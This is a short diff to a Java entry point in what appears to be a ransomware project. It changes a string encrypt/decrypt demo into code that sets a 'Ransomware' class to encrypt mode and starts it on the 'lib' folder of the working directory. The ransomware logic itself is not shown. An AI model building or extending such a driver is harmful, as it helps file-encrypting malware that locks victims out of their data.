@@ -1,13 +1,10 @@
+import java.nio.file.Path;
+
 public class Main {
-    public static void main(String[] args) {
-        String message = "Testing once more";
-        System.out.println("Original Message: " + message);
-
-        String encryptedMessage = Ransomware.process(message, Ransomware.Mode.Encrypt);
-        System.out.println("Encrypted Message: " + encryptedMessage);
-
-        String decryptedMessage = Ransomware.process(encryptedMessage, Ransomware.Mode.Decrypt);
-        System.out.println("Decrypted Message: " + decryptedMessage);
+    public static void main(String[] args) throws Exception {
+        Path directory = Path.of(System.getProperty("user.dir"), "lib");
+        Ransomware.setMode(Ransomware.Mode.Encrypt);
+        Ransomware.initialize(directory);
     }
 }
 
